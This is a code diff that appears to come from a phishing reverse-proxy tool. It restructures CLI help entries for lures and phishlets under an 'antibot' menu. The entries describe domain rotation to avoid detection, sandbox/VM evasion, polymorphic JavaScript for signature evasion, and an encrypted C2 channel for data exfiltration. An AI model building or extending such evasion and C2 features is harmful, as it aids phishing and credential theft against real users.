-			readline.PcItem("provider", readline.PcItem("recaptcha_v2"), readline.PcItem("recaptcha_v3"), readline.PcItem("hcaptcha"), readline.PcItem("turnstile")),
-			readline.PcItem("configure"),
-			readline.PcItem("require", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("test")))
-
-	h.AddSubCommand("captcha", nil, "", "show CAPTCHA configuration and statistics")
-	h.AddSubCommand("captcha", []string{"enable"}, "enable <on|off>", "enable or disable CAPTCHA protection")
-	h.AddSubCommand("captcha", []string{"provider"}, "provider <name>", "set active CAPTCHA provider")
-	h.AddSubCommand("captcha", []string{"configure"}, "configure <provider> <site_key> <secret_key> [options]", "configure a CAPTCHA provider")
-	h.AddSubCommand("captcha", []string{"require"}, "require <on|off>", "require CAPTCHA verification for all lures")
-	h.AddSubCommand("captcha", []string{"test"}, "test", "open test page to verify CAPTCHA configuration")
-
-	h.AddCommand("domain-rotation", "general", "manage automatic domain rotation", "Configure and manage automatic domain rotation system for avoiding detection.", LAYER_TOP,
-		readline.PcItem("domain-rotation",
-			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("strategy", readline.PcItem("round-robin"), readline.PcItem("weighted"), readline.PcItem("health-based"), readline.PcItem("random")),
-			readline.PcItem("interval"),
-			readline.PcItem("max-domains"),
-			readline.PcItem("auto-generate", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("add-domain"),
-			readline.PcItem("remove-domain"),
-			readline.PcItem("list"),
-			readline.PcItem("add-provider"),
-			readline.PcItem("mark-compromised"),
-			readline.PcItem("stats")))
-
-	h.AddSubCommand("domain-rotation", nil, "", "show domain rotation configuration and statistics")
-	h.AddSubCommand("domain-rotation", []string{"enable"}, "enable <on|off>", "enable or disable domain rotation")
-	h.AddSubCommand("domain-rotation", []string{"strategy"}, "strategy <type>", "set rotation strategy (round-robin, weighted, health-based, random)")
-	h.AddSubCommand("domain-rotation", []string{"interval"}, "interval <minutes>", "set rotation interval in minutes")
-	h.AddSubCommand("domain-rotation", []string{"max-domains"}, "max-domains <count>", "set maximum number of domains in rotation pool")
-	h.AddSubCommand("domain-rotation", []string{"auto-generate"}, "auto-generate <on|off>", "enable automatic domain generation")
-	h.AddSubCommand("domain-rotation", []string{"add-domain"}, "add-domain <domain> <subdomain> <provider>", "add domain to rotation pool")
-	h.AddSubCommand("domain-rotation", []string{"remove-domain"}, "remove-domain <full_domain>", "remove domain from rotation pool")
-	h.AddSubCommand("domain-rotation", []string{"list"}, "list", "list all domains in rotation pool")
-	h.AddSubCommand("domain-rotation", []string{"add-provider"}, "add-provider <name> <type> <api_key> <api_secret> <zone>", "add DNS provider")
-	h.AddSubCommand("domain-rotation", []string{"mark-compromised"}, "mark-compromised <full_domain> <reason>", "mark domain as compromised")
-	h.AddSubCommand("domain-rotation", []string{"stats"}, "stats", "show detailed domain rotation statistics")
-
-	h.AddCommand("traffic-shaping", "general", "manage intelligent traffic shaping and rate limiting", "Configure adaptive rate limiting, DDoS protection, and bandwidth management.", LAYER_TOP,
-		readline.PcItem("traffic-shaping",
-			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("mode", readline.PcItem("adaptive"), readline.PcItem("strict"), readline.PcItem("learning")),
-			readline.PcItem("global-limit"),
-			readline.PcItem("ip-limit"),
-			readline.PcItem("bandwidth-limit"),
-			readline.PcItem("geo-rule"),
-			readline.PcItem("stats")))
-
-	h.AddSubCommand("traffic-shaping", nil, "", "show traffic shaping configuration and statistics")
-	h.AddSubCommand("traffic-shaping", []string{"enable"}, "enable <on|off>", "enable or disable traffic shaping")
-	h.AddSubCommand("traffic-shaping", []string{"mode"}, "mode <adaptive|strict|learning>", "set traffic shaping mode")
-	h.AddSubCommand("traffic-shaping", []string{"global-limit"}, "global-limit <rate> <burst>", "set global rate limit (requests/sec)")
-	h.AddSubCommand("traffic-shaping", []string{"ip-limit"}, "ip-limit <rate> <burst>", "set per-IP rate limit (requests/sec)")
-	h.AddSubCommand("traffic-shaping", []string{"bandwidth-limit"}, "bandwidth-limit <bytes/sec>", "set bandwidth limit")
-	h.AddSubCommand("traffic-shaping", []string{"geo-rule"}, "geo-rule <country> <rate> <burst> <priority> <block>", "configure geographic rule")
-	h.AddSubCommand("traffic-shaping", []string{"stats"}, "stats", "show detailed traffic shaping statistics")
-
-	h.AddCommand("sandbox", "general", "manage sandbox and VM detection", "Configure sandbox/VM detection and evasion settings.", LAYER_TOP,
-		readline.PcItem("sandbox",
-			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("mode", readline.PcItem("passive"), readline.PcItem("active"), readline.PcItem("aggressive")),
-			readline.PcItem("threshold"),
-			readline.PcItem("action", readline.PcItem("block"), readline.PcItem("redirect"), readline.PcItem("honeypot")),
-			readline.PcItem("redirect"),
-			readline.PcItem("honeypot"),
-			readline.PcItem("stats")))
-
-	h.AddSubCommand("sandbox", nil, "", "show sandbox detection configuration")
-	h.AddSubCommand("sandbox", []string{"enable"}, "enable <on|off>", "enable or disable sandbox detection")
-	h.AddSubCommand("sandbox", []string{"mode"}, "mode <passive|active|aggressive>", "set detection mode")
-	h.AddSubCommand("sandbox", []string{"threshold"}, "threshold <0.0-1.0>", "set detection confidence threshold")
-	h.AddSubCommand("sandbox", []string{"action"}, "action <block|redirect|honeypot>", "set action on detection")
-	h.AddSubCommand("sandbox", []string{"redirect"}, "redirect <url>", "set redirect URL for detected sandboxes")
-	h.AddSubCommand("sandbox", []string{"honeypot"}, "honeypot <html>", "set honeypot response HTML")
-	h.AddSubCommand("sandbox", []string{"stats"}, "stats", "show sandbox detection statistics")
-
-	h.AddCommand("c2", "general", "manage command and control channel", "Configure encrypted C2 communications for data exfiltration and remote control.", LAYER_TOP,
-		readline.PcItem("c2",
-			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("transport", readline.PcItem("https"), readline.PcItem("dns")),
-			readline.PcItem("server", readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("list")),
-			readline.PcItem("key", readline.PcItem("generate"), readline.PcItem("import"), readline.PcItem("export")),
-			readline.PcItem("auth"),
-			readline.PcItem("test"),
-			readline.PcItem("status")))
-
-	h.AddSubCommand("c2", nil, "", "show C2 channel configuration and status")
-	h.AddSubCommand("c2", []string{"enable"}, "enable <on|off>", "enable or disable C2 channel")
-	h.AddSubCommand("c2", []string{"transport"}, "transport <https|dns>", "set C2 transport method")
-	h.AddSubCommand("c2", []string{"server", "add"}, "server add <id> <url> <priority>", "add C2 server")
-	h.AddSubCommand("c2", []string{"server", "remove"}, "server remove <id>", "remove C2 server")
-	h.AddSubCommand("c2", []string{"server", "list"}, "server list", "list all C2 servers")
-	h.AddSubCommand("c2", []string{"key", "generate"}, "key generate", "generate new encryption key")
-	h.AddSubCommand("c2", []string{"key", "import"}, "key import <base64_key>", "import encryption key")
-	h.AddSubCommand("c2", []string{"key", "export"}, "key export", "export encryption key")
-	h.AddSubCommand("c2", []string{"auth"}, "auth <token>", "set authentication token")
-	h.AddSubCommand("c2", []string{"test"}, "test", "test C2 connection")
-	h.AddSubCommand("c2", []string{"status"}, "status", "show C2 channel statistics")
-
-	h.AddCommand("polymorphic", "general", "manage polymorphic JavaScript engine", "Configure dynamic JavaScript mutation for signature evasion.", LAYER_TOP,
-		readline.PcItem("polymorphic",
-			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("level", readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high"), readline.PcItem("extreme")),
-			readline.PcItem("cache", readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("clear")),
-			readline.PcItem("seed-rotation"),
-			readline.PcItem("template-mode", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("mutation", readline.PcItem("variables"), readline.PcItem("functions"), readline.PcItem("deadcode"),
-				readline.PcItem("controlflow"), readline.PcItem("strings"), readline.PcItem("math"),
-				readline.PcItem("comments"), readline.PcItem("whitespace")),
-			readline.PcItem("test"),
-			readline.PcItem("stats")))
-
-	h.AddSubCommand("polymorphic", nil, "", "show polymorphic engine configuration")
-	h.AddSubCommand("polymorphic", []string{"enable"}, "enable <on|off>", "enable or disable polymorphic engine")
-	h.AddSubCommand("polymorphic", []string{"level"}, "level <low|medium|high|extreme>", "set mutation level")
-	h.AddSubCommand("polymorphic", []string{"cache"}, "cache <on|off|clear>", "manage mutation cache")
-	h.AddSubCommand("polymorphic", []string{"seed-rotation"}, "seed-rotation <minutes>", "set seed rotation interval")
-	h.AddSubCommand("polymorphic", []string{"template-mode"}, "template-mode <on|off>", "enable template-based mutations")
-	h.AddSubCommand("polymorphic", []string{"mutation"}, "mutation <type> <on|off>", "toggle specific mutation types")
-	h.AddSubCommand("polymorphic", []string{"test"}, "test [code]", "test polymorphic mutations")
-	h.AddSubCommand("polymorphic", []string{"stats"}, "stats", "show polymorphic engine statistics")
+	h.AddSubCommand("antibot", nil, "", "show main antibot configuration menu")
+	h.AddSubCommand("antibot", []string{"enabled"}, "enabled <true|false>", "enable or disable antibot detection")
+	h.AddSubCommand("antibot", []string{"action"}, "action <block|spoof>", "set action when bot is detected")
+	h.AddSubCommand("antibot", []string{"spoof_url"}, "spoof_url <url>", "set URL to redirect detected bots to when action is 'spoof'")
+	h.AddSubCommand("antibot", []string{"threshold"}, "threshold <0.0-9.9>", "set ML detection confidence threshold")
+	h.AddSubCommand("antibot", []string{"override_ips"}, "override_ips <list|add|remove>", "manage IPs that bypass antibot detection")
+	h.AddSubCommand("antibot", []string{"override_ips", "add"}, "override_ips add <ip>", "whitelist IP to bypass antibot checks")
+	h.AddSubCommand("antibot", []string{"override_ips", "remove"}, "override_ips remove <ip>", "remove IP from antibot whitelist")
+	
+	h.AddSubCommand("antibot", []string{"ja3"}, "ja3 [stats|signatures|add|export]", "manage JA3/JA3S TLS fingerprinting")
+	h.AddSubCommand("antibot", []string{"captcha"}, "captcha [enable|provider|configure|require|test]", "manage CAPTCHA protection")
+	h.AddSubCommand("antibot", []string{"domain-rotation"}, "domain-rotation [enable|strategy|interval|stats...]", "manage automatic domain rotation")
+	h.AddSubCommand("antibot", []string{"traffic-shaping"}, "traffic-shaping [enable|mode|global-limit|stats...]", "manage traffic shaping")
+	h.AddSubCommand("antibot", []string{"sandbox"}, "sandbox [enable|mode|action|stats...]", "manage sandbox detection")
+	h.AddSubCommand("antibot", []string{"polymorphic"}, "polymorphic [enable|level|cache|stats...]", "manage polymorphic JavaScript engine")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
